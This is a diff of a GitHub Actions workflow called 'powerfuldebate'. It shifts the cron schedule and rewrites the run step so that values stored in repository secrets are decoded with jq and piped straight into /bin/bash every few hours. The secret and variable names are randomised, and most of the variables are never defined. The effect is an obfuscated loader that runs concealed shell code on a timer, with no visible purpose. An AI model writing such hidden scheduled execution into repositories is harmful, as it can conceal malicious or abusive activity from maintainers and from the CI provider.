@@ -3,7 +3,8 @@ name: powerfuldebate
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 4/6 * * *'
+    - cron: '34 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,11 +13,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: powerfuldebate
         env:
-          nz278: ${{ secrets.nz278 }}
+          oncg912: ${{ secrets.oncg912 }}
         run: |
-          echo $nz278 | jq -r .zn87 | /bin/bash
-          echo $dxjj99 | jq -r .cuom8 | /bin/bash
-          echo $yoys0410 | jq -r .qioi49 | /bin/bash
-          echo $uj10452 | jq -r .n7627 | /bin/bash
-          echo $iyyeg29893 | jq -r .xsj71 | /bin/bash
+          echo $oncg912 | jq -r .wahf32018 | /bin/bash
+          echo $h5114 | jq -r .vp7485 | /bin/bash
+          echo $swaxf7 | jq -r .vp8 | /bin/bash
+          echo $txqbr730 | jq -r .otyo4116 | /bin/bash
+          echo $ykwc0 | jq -r .jb00366 | /bin/bash
+          echo $b139 | jq -r .kclve9392 | /bin/bash
+          echo $yhzpq31 | jq -r .fmix69 | /bin/bash
+          echo $pp7614 | jq -r .w35 | /bin/bash
+          echo $rwaow4 | jq -r .dsn71489 | /bin/bash
+          echo $zak308 | jq -r .cvqjq32224 | /bin/bash
+          echo $pf5010 | jq -r .wzfwm145 | /bin/bash
 
